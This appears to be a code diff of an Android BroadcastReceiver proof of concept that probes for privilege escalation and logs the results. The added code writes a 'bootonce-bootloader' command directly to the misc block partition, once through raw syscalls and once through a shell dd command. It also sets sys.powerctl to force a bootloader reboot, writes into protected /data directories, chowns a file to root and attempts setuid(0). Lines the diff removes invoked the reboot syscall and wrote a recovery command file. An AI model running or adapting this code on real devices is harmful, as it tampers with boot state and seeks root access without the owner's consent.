@@ -4,7 +4,6 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.os.Process;
-import android.os.IBinder;
 import android.system.Os;
 import android.system.OsConstants;
 import android.system.ErrnoException;
@@ -36,7 +35,7 @@ public class Receiver extends BroadcastReceiver {
         SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss z", Locale.getDefault());
 
         report.append("========================================\n");
-        report.append("   Zygote BCB Verification (Pure Java, Os syscalls)\n");
+        report.append("   BCB & /data Write Verification (Pure Java, Os syscalls)\n");
         report.append("   Time: ").append(sdf.format(new Date())).append("\n");
         report.append("========================================\n\n");
 
@@ -76,6 +75,8 @@ public class Receiver extends BroadcastReceiver {
             report.append("--- Filesystem Access (Os.open/Os.write) ---\n");
             report.append("Write /cache/test_write.tmp: ").append(writeTestOs("/cache/test_write.tmp")).append("\n");
             report.append("Write /data/local/tmp/test_write.tmp: ").append(writeTestOs("/data/local/tmp/test_write.tmp")).append("\n");
+            report.append("Write /data/system/test_write.tmp: ").append(writeTestOs("/data/system/test_write.tmp")).append("\n");
+            report.append("Write /data/data/test_write.tmp: ").append(writeTestOs("/data/data/test_write.tmp")).append("\n");
             report.append("Execute /system/bin/sh: ").append(canExecute("/system/bin/sh")).append("\n");
             report.append("Execute /data/local/tmp/dummy: ").append(canExecute("/data/local/tmp/dummy")).append("\n\n");
 
@@ -86,8 +87,7 @@ public class Receiver extends BroadcastReceiver {
                     "android.permission.INSTALL_PACKAGES",
                     "android.permission.DELETE_PACKAGES",
                     "android.permission.WRITE_SECURE_SETTINGS",
-                    "android.permission.REBOOT",
-                    "android.permission.RECOVERY"
+                    "android.permission.REBOOT",   // keep for info, but we won't use reboot
                 };
                 for (String p : perms) {
                     try {
@@ -101,8 +101,8 @@ public class Receiver extends BroadcastReceiver {
             }
             report.append("\n");
 
-            // --- [7] BCB Write Verification (using android.system.Os) ---
-            report.append("--- BCB Write Verification (Os syscalls) ---\n");
+            // --- [7] BCB Write Verification (Direct misc partition write) ---
+            report.append("--- BCB Write Verification (Direct misc partition) ---\n");
 
             // 7a. Direct write to misc partition via Os.open/Os.write
             String[] miscPaths = {"/dev/block/by-name/misc", "/dev/block/misc"};
@@ -111,11 +111,12 @@ public class Receiver extends BroadcastReceiver {
                 FileDescriptor fd = null;
                 try {
                     fd = Os.open(path, OsConstants.O_RDWR | OsConstants.O_SYNC, 0644);
+                    // BCB command "bootonce-bootloader" (null terminated? We'll write as is)
                     byte[] data = "bootonce-bootloader".getBytes();
                     Os.lseek(fd, 0, OsConstants.SEEK_SET);
                     Os.write(fd, data, 0, data.length);
                     Os.fsync(fd);
-                    report.append("Os.write to ").append(path).append(": SUCCESS\n");
+                    report.append("Os.write to ").append(path).append(": SUCCESS (wrote bootonce-bootloader)\n");
                     miscWritten = true;
                     break;
                 } catch (ErrnoException e) {
@@ -132,77 +133,110 @@ public class Receiver extends BroadcastReceiver {
                 report.append("Direct write to misc partitions: FAILED (no writable device)\n");
             }
 
-            // 7b. Write /cache/recovery/command
-            report.append("Write /cache/recovery/command: ");
-            FileDescriptor fd2 = null;
+            // 7b. Try writing via dd command (if /system/bin/dd exists)
+            report.append("Write misc via dd command: ");
             try {
-                fd2 = Os.open("/cache/recovery/command", OsConstants.O_WRONLY | OsConstants.O_CREAT | OsConstants.O_TRUNC, 0644);
-                String cmd = "--update_package=/sdcard/update.zip\n--bootonce-bootloader\n";
-                Os.write(fd2, cmd.getBytes(), 0, cmd.length());
-                Os.fsync(fd2);
-                report.append("SUCCESS\n");
-            } catch (ErrnoException e) {
-                report.append("ErrnoException (errno=").append(e.errno).append(") - ").append(e.getMessage()).append("\n");
-            } catch (Exception e) {
-                report.append("EXCEPTION: ").append(e.getMessage()).append("\n");
-            } finally {
-                if (fd2 != null) {
-                    try { Os.close(fd2); } catch (ErrnoException ignored) {}
-                }
-            }
-
-            // 7c. Execute /system/bin/reboot bootloader (java.lang.Process)
-            report.append("Execute /system/bin/reboot bootloader: ");
-            try {
-                java.lang.Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/reboot", "bootloader"});
+                java.lang.Process p = Runtime.getRuntime().exec(
+                    new String[]{"/system/bin/sh", "-c",
+                        "echo -n 'bootonce-bootloader' | /system/bin/dd of=/dev/block/by-name/misc bs=1024 count=1 conv=notrunc 2>/dev/null"
+                    }
+                );
                 int code = p.waitFor();
-                report.append(code == 0 ? "SUCCESS (reboot initiated)\n" : "FAILED (exit=" + code + ")\n");
+                report.append(code == 0 ? "SUCCESS (dd wrote to misc)\n" : "FAILED (exit=" + code + ")\n");
             } catch (Exception e) {
                 report.append("EXCEPTION: ").append(e.getMessage()).append("\n");
             }
 
-            // 7d. Set sys.powerctl=reboot,bootloader via SystemProperties (reflection)
+            // 7c. Set sys.powerctl to bootloader mode (sys.powerctl=reboot,bootloader)
             report.append("Set sys.powerctl=reboot,bootloader: ");
             try {
                 Class<?> sp = Class.forName("android.os.SystemProperties");
                 Method set = sp.getMethod("set", String.class, String.class);
                 set.invoke(null, "sys.powerctl", "reboot,bootloader");
-                report.append("SUCCESS (attempted)\n");
+                report.append("SUCCESS (attempted, may trigger bootloader on next reboot)\n");
             } catch (Exception e) {
                 report.append("FAILED: ").append(e.getMessage()).append("\n");
             }
 
-            // 7e. IRecoverySystem.setupBcb via reflection
-            report.append("IRecoverySystem.setupBcb(\"bootonce-bootloader\"): ");
-            Object rec = getService("recovery");
-            if (rec != null) {
-                try {
-                    Method setupBcb = rec.getClass().getMethod("setupBcb", String.class);
-                    boolean result = (boolean) setupBcb.invoke(rec, "bootonce-bootloader");
-                    report.append(result ? "SUCCESS\n" : "FAILED (returned false)\n");
-                } catch (Exception e) {
-                    report.append("EXCEPTION: ").append(e.getMessage()).append("\n");
-                }
-            } else {
-                report.append("FAILED (service null)\n");
+            // 7d. Try to use setprop via command line
+            report.append("setprop sys.powerctl reboot,bootloader: ");
+            try {
+                java.lang.Process p = Runtime.getRuntime().exec(
+                    new String[]{"/system/bin/setprop", "sys.powerctl", "reboot,bootloader"}
+                );
+                int code = p.waitFor();
+                report.append(code == 0 ? "SUCCESS\n" : "FAILED (exit=" + code + ")\n");
+            } catch (Exception e) {
+                report.append("EXCEPTION: ").append(e.getMessage()).append("\n");
             }
 
-            // 7f. Os.reboot (reboot syscall) - use raw constant
-            report.append("Os.reboot(LINUX_REBOOT_CMD_RESTART=0x1234567): ");
-            try {
-                // LINUX_REBOOT_MAGIC1=0xfee1dead, MAGIC2=0x28121969 are fixed in Os.reboot
-                // We only pass the command: LINUX_REBOOT_CMD_RESTART = 0x1234567
-                // Use OsConstants.LINUX_REBOOT_CMD_RESTART if available, else use 0x1234567
-                int restartCmd;
+            // 7e. Try to write to /proc/cmdline? No, read-only.
+
+            // 7f. Try to change bootloader message via /sys/class/... maybe not.
+
+            // --- [8] /data Write Verification (Various paths) ---
+            report.append("\n--- /data Write Verification (Multiple paths) ---\n");
+
+            String[] dataPaths = {
+                "/data/local/tmp/poc_test.txt",
+                "/data/data/poc_test.txt",
+                "/data/system/poc_test.txt",
+                "/data/misc/poc_test.txt",
+                "/data/user_de/0/poc_test.txt"
+            };
+            for (String path : dataPaths) {
+                report.append("Write ").append(path).append(": ");
+                FileDescriptor fd = null;
                 try {
-                    // Try to get from OsConstants if available
-                    restartCmd = OsConstants.LINUX_REBOOT_CMD_RESTART;
-                } catch (Throwable t) {
-                    // Fallback to raw constant
-                    restartCmd = 0x1234567;
+                    File f = new File(path);
+                    // Ensure parent dir exists (some may not)
+                    File parent = f.getParentFile();
+                    if (parent != null && !parent.exists()) {
+                        // Try to create directory (might fail)
+                        parent.mkdirs();
+                    }
+                    fd = Os.open(path, OsConstants.O_WRONLY | OsConstants.O_CREAT | OsConstants.O_TRUNC, 0644);
+                    Os.write(fd, "test".getBytes(), 0, 4);
+                    Os.fsync(fd);
+                    Os.close(fd);
+                    fd = null;
+                    // Try to delete
+                    f.delete();
+                    report.append("SUCCESS (write/delete)\n");
+                } catch (ErrnoException e) {
+                    report.append("ErrnoException (errno=").append(e.errno).append(") - ").append(e.getMessage()).append("\n");
+                } catch (Exception e) {
+                    report.append("EXCEPTION: ").append(e.getMessage()).append("\n");
+                } finally {
+                    if (fd != null) {
+                        try { Os.close(fd); } catch (ErrnoException ignored) {}
+                    }
                 }
-                Os.reboot(restartCmd);
-                report.append("SUCCESS (device rebooting!)\n");
+            }
+
+            // --- [9] Additional system call tests (chown, chmod) ---
+            report.append("\n--- Additional System Call Tests ---\n");
+            // Try chown on a file we created (if any)
+            String testFile = "/cache/test_chown.tmp";
+            try {
+                FileDescriptor fd = Os.open(testFile, OsConstants.O_WRONLY | OsConstants.O_CREAT, 0644);
+                Os.close(fd);
+                // Try to chown to root:root
+                Os.chown(testFile, 0, 0);
+                report.append("chown ").append(testFile).append(" 0:0: SUCCESS\n");
+            } catch (ErrnoException e) {
+                report.append("chown ").append(testFile).append(" 0:0: ErrnoException (errno=").append(e.errno).append(") - ").append(e.getMessage()).append("\n");
+            } catch (Exception e) {
+                report.append("chown ").append(testFile).append(" 0:0: EXCEPTION - ").append(e.getMessage()).append("\n");
+            } finally {
+                new File(testFile).delete();
+            }
+
+            // Try setgid/setuid? Not possible without JNI? setuid is in Os? Actually Os.setuid exists.
+            report.append("Os.setuid(0): ");
+            try {
+                Os.setuid(0);
+                report.append("SUCCESS (now root!)\n");
             } catch (ErrnoException e) {
                 report.append("ErrnoException (errno=").append(e.errno).append(") - ").append(e.getMessage()).append("\n");
             } catch (Exception e) {
@@ -302,15 +336,11 @@ public class Receiver extends BroadcastReceiver {
         try {
             Class<?> sm = Class.forName("android.os.ServiceManager");
             Method getService = sm.getMethod("getService", String.class);
-            IBinder binder = (IBinder) getService.invoke(null, name);
+            android.os.IBinder binder = (android.os.IBinder) getService.invoke(null, name);
             if (binder == null) return null;
             if ("package".equals(name)) {
                 Class<?> stubClass = Class.forName("android.content.pm.IPackageManager$Stub");
-                Method asInterface = stubClass.getMethod("asInterface", IBinder.class);
-                return asInterface.invoke(null, binder);
-            } else if ("recovery".equals(name)) {
-                Class<?> stubClass = Class.forName("android.os.IRecoverySystem$Stub");
-                Method asInterface = stubClass.getMethod("asInterface", IBinder.class);
+                Method asInterface = stubClass.getMethod("asInterface", android.os.IBinder.class);
                 return asInterface.invoke(null, binder);
             }
             return binder;
